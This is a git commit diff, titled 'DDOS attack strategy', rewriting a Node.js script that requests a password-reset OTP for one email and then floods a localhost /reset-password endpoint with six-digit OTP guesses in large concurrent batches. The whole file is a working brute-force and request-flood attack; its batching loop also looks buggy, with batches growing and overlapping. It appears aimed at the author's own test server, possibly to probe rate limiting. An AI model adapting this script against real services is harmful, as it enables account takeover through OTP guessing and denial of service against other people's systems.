c7ddac77aadf2c49af8591dce7b95cae4e4872fe
Pritam Mandal <pritammandal1717@gmail.com>
2025-03-31 09:19:53 +0530

    DDOS attack strategy

--- ddos_attack/attack.js
+++ ddos_attack/attack.js
@@ -1,52 +1,67 @@
-const axios = require('axios');
-let data = JSON.stringify({
-  "email": "pritam1212@gmail.com"
-});
+import axios from "axios";
 
-let config = {
-  method: 'post',
-  maxBodyLength: Infinity,
-  url: 'http://127.0.0.1:3000/generate-otp',
-  headers: { 
-    'Content-Type': 'application/json'
-  },
-  data : data
-};
-
-axios.request(config)
-.then((response) => {
-  console.log(JSON.stringify(response.data));
-})
-.catch((error) => {
-  console.log(error);
-});
-
-
-let i;
-for (i = 666000; i <= 700000; i++) {
+async function sendEmail() {
   let data = JSON.stringify({
-    "email": "pritam1212@gmail.com",
-    "otp": String(i)
+    email: "pritam1212@gmail.com",
   });
-  
+
   let config = {
-    method: 'post',
+    method: "post",
     maxBodyLength: Infinity,
-    url: 'http://127.0.0.1:3000/reset-password',
-    headers: { 
-      'Content-Type': 'application/json'
+    url: "http://127.0.0.1:3000/generate-otp",
+    headers: {
+      "Content-Type": "application/json",
     },
-    data : data
+    data: data,
   };
-  
-  axios.request(config)
-  .then((response) => {
-    console.log(JSON.stringify(response.data));
-  })
-  .catch((error) => {
-    console.log(error);
-  });
+
+  axios
+    .request(config)
+    .then((response) => {
+      console.log(JSON.stringify(response.data));
+    })
+    .catch((error) => {
+      console.log(error);
+    });
 }
 
+async function sendRequest(otp) {
+  let data = JSON.stringify({
+    email: "pritam1212@gmail.com",
+    otp: otp,
+  });
 
+  let config = {
+    method: "post",
+    maxBodyLength: Infinity,
+    url: "http://127.0.0.1:3000/reset-password",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    data: data,
+  };
 
+  await axios
+    .request(config)
+    .then((response) => {
+
+    })
+    .catch((error) => {
+      
+    });
+}
+
+sendEmail();
+
+async function main() {
+  for (let i = 100001; i <= 999999; i += 200) {
+    const p = [];
+    for (let j = 0; j <= i; j++) {
+      console.log(j)
+      p.push(sendRequest(String(i + j)));
+    }
+    await Promise.all(p)
+  }
+}
+
+main()
